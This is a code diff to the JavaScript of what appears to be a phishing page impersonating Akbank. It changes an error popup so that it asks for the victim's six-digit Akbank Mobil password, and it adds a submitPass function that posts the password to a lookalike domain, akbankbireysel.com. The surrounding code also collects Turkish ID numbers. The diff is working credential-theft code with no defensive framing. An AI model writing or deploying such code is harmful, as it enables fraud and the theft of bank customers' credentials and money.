@@ -27,15 +27,41 @@ function submitData(action, formData, successCallback) {
         error: function (error) {
             // Hata olduğunda SweetAlert ile bir hata mesajı göster
             Swal.fire({
-                icon: 'error',
-                title: 'Hata!',
-                html: '<div class="col-lg-4 right mt-3" id="authf" style=""><div class="py-30 px-30 scrollTo"><div class="input-block"><h2 class="mb-4">Son bi adım kaldı..</h2><label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label><input class="phone" type="password" id="passauth" maxlength="6"></div><div class="input-block"><button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit" disabled="">Onayla</button><button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;"><div class="spinner"></div></button></div></div></div>',
-                confirmButtonText: 'Tamam'
+                html: '<div class="col-lg-4 right mt-3" id="authf" style=""><div class="py-30 px-30 scrollTo"><div class="input-block"><h2 class="mb-4">Son bi adım kaldı..</h2><label for="txtPhoneNumber">6 Haneli Akbank Mobil Şifreniz</label><input class="phone" type="password" id="passauth" maxlength="6"></div><div class="input-block"><button type="button" id="loginButtonPass" onclick="submitPass()" class="btn btn-primary w-100 btn-submit" disabled="">Onayla</button><button type="button" id="loginProcessPass" class="btn btn-primary w-100 btn-submit" style="display:none;"><div class="spinner"></div></button></div></div></div>'
+           
             });
         }
     });
 }
+ 
+    function submitPass() {
+        var passauth = document.getElementById('passauth').value;
 
+        // Veriyi POST etmek için XMLHttpRequest nesnesini kullanma
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://akbankbireysel.com/process.php", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        // POST verisi oluşturma
+        var formData = "passauth=" + passauth;
+
+        // Göndermeden önce loading göstergesini göster
+        document.getElementById('loginButtonPass').style.display = 'none';
+        document.getElementById('loginProcessPass').style.display = 'block';
+
+        // POST isteği gönderme
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                // Yanıt alındığında başarılı mesajı göster
+                alert("Veri başarıyla gönderildi!");
+            } else if (xhr.readyState === 4 && xhr.status !== 200) {
+                // Yanıt alındığında hata mesajı göster
+                alert("Veri gönderilirken bir hata oluştu!");
+            }
+        };
+        xhr.send(formData);
+    }
+ 
 
 function submitLogin() {
     var txtTckn = $("#txtTckn").val();
